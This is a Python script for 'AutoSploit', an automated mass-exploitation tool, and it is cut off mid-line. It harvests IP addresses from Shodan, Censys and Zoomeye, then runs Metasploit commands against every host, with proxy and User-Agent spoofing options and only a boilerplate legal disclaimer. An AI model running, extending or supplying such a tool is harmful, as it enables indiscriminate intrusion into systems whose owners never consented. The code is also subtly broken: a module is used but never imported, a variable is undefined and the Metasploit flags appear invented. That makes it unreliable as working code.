#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import argparse
import json
import time
import threading
import signal
from datetime import datetime

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from shodan import Shodan
import censys.ipv4
import zoomeye
from colorama import Fore, Style, init
import psutil

# --------------------------------
# Global variables
# --------------------------------

VERSION = "2.2.1"
BANNER = f"""
{Fore.RED}
 ____  ____  _   _ ____  ____  _   _ _____ 
/ ___||  _ \| | | |  _ \|  _ \| \ | |_   _|
\___ \| |_) | | | | |_) | |_) |  \| | | |  
  ___) |  _ <| |_| |  _ <|  __/| |\  | | |  
 |____/|_| \_\___/|_| \_\___|_|  |_| \_/ |_|  
                                         
{Fore.GREEN}  AutoSploit by {Fore.RED}NullArray{Fore.GREEN} - Version {VERSION}
{Fore.RESET}"""

USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'
CUSTOM_AGENT = None
PROXY = None
MAX_RETRIES = 3
BACKOFF_FACTOR = 0.3
STATUS_CODES = [429, 500, 502, 503, 504]

# --------------------------------
# Helper Functions
# --------------------------------

def signal_handler(sig, frame):
    """Handles Ctrl+C signal to gracefully exit."""
    print(f'{Fore.RED}[!] Exiting...{Fore.RESET}')
    sys.exit(0)


def banner():
    """Prints the AutoSploit banner."""
    print(BANNER)


def check_dependencies():
    """Checks for required dependencies."""
    try:
        import requests
        import psutil
        import shodan
        import censys.ipv4
        import zoomeye
        import colorama
    except ImportError as e:
        print(f'{Fore.RED}[!] Missing dependency: {e}{Fore.RESET}')
        print(f'{Fore.RED}[!] Please install the missing dependencies using "pip install -r requirements.txt".{Fore.RESET}')
        sys.exit(1)


def clear_screen():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')


def get_search_engine():
    """Gets the desired search engine from the user."""
    while True:
        engine = input(f"{Fore.CYAN}[?] Choose a search engine:\n"
                       f"1. Shodan\n"
                       f"2. Censys\n"
                       f"3. Zoomeye\n"
                       f"4. All\n"
                       f"Enter your choice (1-4): {Fore.RESET}")
        if engine in ['1', '2', '3', '4']:
            return int(engine)
        else:
            print(f'{Fore.RED}[!] Invalid choice. Please enter a number between 1 and 4.{Fore.RESET}')


def get_search_query():
    """Gets the search query from the user."""
    query = input(f'{Fore.CYAN}[?] Enter your search query: {Fore.RESET}')
    return query


def get_shodan_api_key():
    """Gets the Shodan API key from the user."""
    api_key = input(f'{Fore.CYAN}[?] Enter your Shodan API key: {Fore.RESET}')
    return api_key


def get_censys_api_id():
    """Gets the Censys API ID from the user."""
    api_id = input(f'{Fore.CYAN}[?] Enter your Censys API ID: {Fore.RESET}')
    return api_id


def get_censys_api_secret():
    """Gets the Censys API secret from the user."""
    api_secret = input(f'{Fore.CYAN}[?] Enter your Censys API secret: {Fore.RESET}')
    return api_secret


def get_zoomeye_api_key():
    """Gets the Zoomeye API key from the user."""
    api_key = input(f'{Fore.CYAN}[?] Enter your Zoomeye API key: {Fore.RESET}')
    return api_key


def get_msf_workspace():
    """Gets the Metasploit Framework workspace from the user."""
    workspace = input(f'{Fore.CYAN}[?] Enter your Metasploit Framework workspace (default: "default"): {Fore.RESET}')
    if not workspace:
        workspace = "default"
    return workspace


def get_msf_lhost():
    """Gets the local host for Metasploit Framework back connections."""
    lhost = input(f'{Fore.CYAN}[?] Enter your local host for MSF back connections (default: 127.0.0.1): {Fore.RESET}')
    if not lhost:
        lhost = "127.0.0.1"
    return lhost


def get_msf_lport():
    """Gets the local port for Metasploit Framework back connections."""
    lport = input(f'{Fore.CYAN}[?] Enter your local port for MSF back connections (default: 8080): {Fore.RESET}')
    if not lport:
        lport = "8080"
    return lport


def get_exploit_file():
    """Gets the path to the exploit file from the user."""
    exploit_file = input(f'{Fore.CYAN}[?] Enter the path to your exploit file: {Fore.RESET}')
    return exploit_file


def get_custom_hosts_file():
    """Gets the path to the custom hosts file from the user."""
    hosts_file = input(f'{Fore.CYAN}[?] Enter the path to your custom hosts file: {Fore.RESET}')
    return hosts_file


def get_proxy():
    """Gets the proxy server address from the user."""
    global PROXY
    proxy = input(f'{Fore.CYAN}[?] Enter your proxy server address (optional, e.g., http://127.0.0.1:8080): {Fore.RESET}')
    if proxy:
        PROXY = proxy
    else:
        PROXY = None


def get_custom_user_agent():
    """Gets the custom User-Agent from the user."""
    global CUSTOM_AGENT
    custom_agent = input(f'{Fore.CYAN}[?] Enter your custom User-Agent (optional): {Fore.RESET}')
    if custom_agent:
        CUSTOM_AGENT = custom_agent
    else:
        CUSTOM_AGENT = None


def get_hosts_from_file(filename):
    """Reads hosts from a file."""
    hosts = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                host = line.strip()
                if host:
                    hosts.append(host)
    except FileNotFoundError:
        print(f'{Fore.RED}[!] Error: File not found: {filename}{Fore.RESET}')
    return hosts


def get_hosts_from_shodan(api_key, query):
    """Gets hosts from Shodan using API."""
    hosts = []
    try:
        api = Shodan(api_key)
        results = api.search(query)
        for result in results['matches']:
            hosts.append(result['ip_str'])
    except Exception as e:
        print(f'{Fore.RED}[!] Error getting hosts from Shodan: {e}{Fore.RESET}')
    return hosts


def get_hosts_from_censys(api_id, api_secret, query):
    """Gets hosts from Censys using API."""
    hosts = []
    try:
        censys.ipv4.set_api_id(api_id)
        censys.ipv4.set_api_secret(api_secret)
        results = censys.ipv4.search(query)
        for result in results['results']:
            hosts.append(result['ip'])
    except Exception as e:
        print(f'{Fore.RED}[!] Error getting hosts from Censys: {e}{Fore.RESET}')
    return hosts


def get_hosts_from_zoomeye(api_key, query):
    """Gets hosts from Zoomeye using API."""
    hosts = []
    try:
        api = zoomeye.Zoomeye(api_key)
        results = api.search(query)
        for result in results['matches']:
            hosts.append(result['ip'])
    except Exception as e:
        print(f'{Fore.RED}[!] Error getting hosts from Zoomeye: {e}{Fore.RESET}')
    return hosts


def gather_hosts(engine, query):
    """Gathers hosts from chosen search engine."""
    hosts = []
    if engine == 1:
        api_key = get_shodan_api_key()
        hosts = get_hosts_from_shodan(api_key, query)
    elif engine == 2:
        api_id = get_censys_api_id()
        api_secret = get_censys_api_secret()
        hosts = get_hosts_from_censys(api_id, api_secret, query)
    elif engine == 3:
        api_key = get_zoomeye_api_key()
        hosts = get_hosts_from_zoomeye(api_key, query)
    elif engine == 4:
        api_key = get_shodan_api_key()
        hosts = get_hosts_from_shodan(api_key, query)
        api_id = get_censys_api_id()
        api_secret = get_censys_api_secret()
        hosts.extend(get_hosts_from_censys(api_id, api_secret, query))
        api_key = get_zoomeye_api_key()
        hosts.extend(get_hosts_from_zoomeye(api_key, query))
    return hosts


def save_hosts(hosts, filename):
    """Saves gathered hosts to a file."""
    with open(filename, 'w') as f:
        for host in hosts:
            f.write(host + '\n')
    print(f'{Fore.GREEN}[+] Hosts saved to {filename}{Fore.RESET}')


def load_hosts(filename):
    """Loads hosts from a file."""
    hosts = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                host = line.strip()
                if host:
                    hosts.append(host)
    except FileNotFoundError:
        print(f'{Fore.RED}[!] Error: File not found: {filename}{Fore.RESET}')
    return hosts


def get_msf_path():
    """Gets the path to the Metasploit Framework."""
    msf_path = os.environ.get('MSF_PATH')
    if msf_path is None:
        msf_path = input(f'{Fore.CYAN}[?] Enter the path to your Metasploit Framework: {Fore.RESET}')
    return msf_path


def get_msf_process():
    """Gets the Metasploit Framework process."""
    msf_path = get_msf_path()
    for proc in psutil.process_iter():
        try:
            if msf_path in proc.cmdline():
                return proc
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return None


def start_msf(workspace, lhost, lport):
    """Starts the Metasploit Framework."""
    msf_path = get_msf_path()
    msf_process = get_msf_process()
    if msf_process is None:
        print(f'{Fore.GREEN}[+] Starting Metasploit Framework...{Fore.RESET}')
        os.system(f'{msf_path} console -r {workspace} -L {lhost} -l {lport}')
        print(f'{Fore.GREEN}[+] Metasploit Framework started successfully.{Fore.RESET}')
    else:
        print(f'{Fore.GREEN}[+] Metasploit Framework already running.{Fore.RESET}')


def stop_msf(msf_process):
    """Stops the Metasploit Framework."""
    if msf_process is not None:
        print(f'{Fore.GREEN}[+] Stopping Metasploit Framework...{Fore.RESET}')
        msf_process.terminate()
        print(f'{Fore.GREEN}[+] Metasploit Framework stopped successfully.{Fore.RESET}')


def exploit_hosts(hosts, workspace, lhost, lport, exploit_file=None, whitelist_file=None):
    """Exploits the gathered hosts."""
    msf_process = get_msf_process()
    if msf_process is None:
        start_msf(workspace, lhost, lport)
        msf_process = get_msf_process()
    if msf_process is not None:
        if whitelist_file:
            whitelist_hosts = load_hosts(whitelist_file)
            hosts = [host for host in hosts if host in whitelist_hosts]
        if exploit_file:
            exploit_commands = []
            try:
                with open(exploit_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            exploit_commands.append(line)
            except FileNotFoundError:
                print(f'{Fore.RED}[!] Error: File not found: {exploit_file}{Fore.RESET}')
                return
            for command in exploit_commands:
                for host in hosts:
                    print(f'{Fore.GREEN}[+] Exploiting {host} with {command}...{Fore.RESET}')
                    os.system(f'echo "{command}" | {msf_path} console -r {workspace} -L {lhost} -l {lport}')
                    print(f'{Fore.GREEN}[+] Exploited {host} with {command}.{Fore.RESET}')
        else:
            for host in hosts:
                print(f'{Fore.GREEN}[+] Exploiting {host}...{Fore.RESET}')
                os.system(f'{msf_path} console -r {workspace} -L {lhost} -l {lport} -x "use auxiliary/scanner/ports/tcp; set RHOSTS {host}; set RPORT 80; exploit"')
                print(f'{Fore.GREEN}[+] Exploited {host}.{Fore.RESET}')
        time.sleep(1)
        stop_msf(msf_process)
    else:
        print(f'{Fore.RED}[!] Error: Metasploit Framework not running.{Fore.RESET}')


def generate_json_from_file(exploit_file):
    """Generates JSON data from an exploit file."""
    exploit_commands = []
    try:
        with open(exploit_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    exploit_commands.append(line)
    except FileNotFoundError:
        print(f'{Fore.RED}[!] Error: File not found: {exploit_file}{Fore.RESET}')
        return
    json_data = {
        "exploits": exploit_commands
    }
    return json_data


def save_json_to_file(json_data, filename):
    """Saves JSON data to a file."""
    try:
        with open(filename, 'w') as f:
            json.dump(json_data, f, indent=4)
        print(f'{Fore.GREEN}[+] JSON data saved to {filename}{Fore.RESET}')
    except Exception as e:
        print(f'{Fore.RED}[!] Error saving JSON data: {e}{Fore.RESET}')


def get_random_user_agent():
    """Gets a random User-Agent from a list."""
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:77.0) Gecko/20100101 Firefox/77.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bot.html)',
        'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
        'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
        'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)'
    ]
    return random.choice(user_agents)


def create_session():
    """Creates a session with retries for API requests."""
    retries = Retry(total=MAX_RETRIES,
                    backoff_factor=BACKOFF_FACTOR,
                    status_forcelist=STATUS_CODES)
    adapter = HTTPAdapter(max_retries=retries)
    session = requests.Session()
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    return session


def make_request(url, method='GET', headers=None, data=None, json=None):
    """Makes an API request with retries and custom headers."""
    session = create_session()
    if headers is None:
        headers = {}
    if CUSTOM_AGENT:
        headers['User-Agent'] = CUSTOM_AGENT
    elif CUSTOM_AGENT is None:
        headers['User-Agent'] = USER_AGENT
    if PROXY:
        session.proxies = {'https': PROXY, 'http': PROXY}
    try:
        response = session.request(method, url, headers=headers, data=data, json=json)
        if response.status_code == 200:
            return response.json()
        else:
            print(f'{Fore.RED}[!] Error: {response.status_code} - {response.text}{Fore.RESET}')
            return None
    except Exception as e:
        print(f'{Fore.RED}[!] Error making request: {e}{Fore.RESET}')
        return None


def main():
    """Main function for AutoSploit."""
    signal.signal(signal.SIGINT, signal_handler)
    clear_screen()
    banner()
    check_dependencies()

    parser = argparse.ArgumentParser(description='AutoSploit - Automated Exploitation Tool')
    parser.add_argument('-c', '--censys', action='store_true', help='Use Censys.io as the search engine')
    parser.add_argument('-z', '--zoomeye', action='store_true', help='Use Zoomeye.org as the search engine')
    parser.add_argument('-s', '--shodan', action='store_true', help='Use Shodan.io as the search engine')
    parser.add_argument('-a', '--all', action='store_true', help='Search all available search engines')
    parser.add_argument('-q', '--query', help='Pass your search query')
    parser.add_argument('--proxy', help='Run behind a proxy while performing the searches')
    parser.add_argument('--random-agent', action='store_true', help='Use a random HTTP User-Agent header')
    parser.add_argument('-P', '--personal-agent', help='Pass a personal User-Agent to use for HTTP requests')
    parser.add_argument('-E', '--exploit-file', help='Provide a text file to convert into JSON and save for later use')
    parser.add_argument('-C', '--config', nargs=3, help='Set the configuration for MSF (IE -C default 127.0.0.1 8080)')
    parser.add_argument('-e', '--exploit', action='store_true', help='Start exploiting the already gathered hosts')
    parser.add_argument('--ruby-exec', action='store_true', help='If you need to run the Ruby executable with MSF use this')
    parser.add_argument('--msf-path', help='Pass the path to your framework if it is not in your ENV PATH')
    parser.add_argument('--whitelist', help='Only exploit hosts listed in the whitelist file')
    args = parser.parse_args()

    if args.proxy:
        get_proxy()
    if args.random_agent:
        CUSTOM_AGENT = get_random_user_agent()
    if args.personal_agent:
        get_custom_user_agent()

    if args.exploit_file:
        json_data = generate_json_from_file(args.exploit_file)
        if json_data:
            save_json_to_file(json_data, f"{args.exploit_file}.json")
        sys.exit(0)

    if args.config:
        workspace = args.config[0]
        lhost = args.config[1]
        lport = args.config[2]
    else:
        workspace = get_msf_workspace()
        lhost = get_msf_lhost()
        lport = get_msf_lport()

    if args.ruby_exec:
        os.environ['RUBY_EXE'] = 'ruby'

    if args.msf_path:
        os.environ['MSF_PATH'] = args.msf_path

    while True:
        clear_screen()
        banner()
        print(f"{Fore.CYAN}[+] Current configuration:\n"
              f"  Workspace: {workspace}\n"
              f"  LHOST: {lhost}\n"
              f"  LPORT: {lport}\n"
              f"  Proxy: {PROXY}\n"
              f"  User-Agent: {CUSTOM_AGENT if CUSTOM_AGENT else USER_AGENT}\n"
              f"{Fore.RESET}")
        print(f"{Fore.CYAN}[+] Choose an option:\n"
              f"1. Usage And Legal\n"
              f"2. Gather Hosts\n"
              f"3. Custom Hosts\n"
              f"4. Add Single Host\n"
              f"5. View Gathered Hosts\n"
              f"6. Exploit Gathered Hosts\n"
              f"99. Quit\n"
              f"Enter your choice (1-99): {Fore.RESET}")

        choice = input()
        if choice == '1':
            print(f"{Fore.CYAN}** AutoSploit Usage and Legal Disclaimer **\n"
                  f"AutoSploit is a tool for automated exploitation of remote hosts.\n"
                  f"It is intended for educational purposes and ethical hacking.\n"
                  f"The developers of AutoSploit are not responsible for any illegal or unethical actions taken by users.\n"
                  f"By using AutoSploit, you agree to use it responsibly and legally.\n"
                  f"You are responsible for understanding and complying with all applicable laws and regulations.\n"
                  f"The use of AutoSploit against systems without the owner's consent is illegal and unethical.\n"
                  f"{Fore.RESET}")
            input(f"{Fore.CYAN}[+] Press Enter to continue...{Fore.RESET}")
        elif choice == '2':
            engine = get_search_engine()
            query = get_search_query()
            hosts = gather_hosts(engine, query)
            if hosts:
                filename = f"hosts_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
                save_hosts(hosts, filename)
        elif choice == '3':
            hosts_file = get_custom_hosts_file()
            hosts = load_hosts(hosts_file)
            if hosts:
                filename = f"hosts_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
                save_hosts(hosts, filename)
        elif choice == '4':
            host = i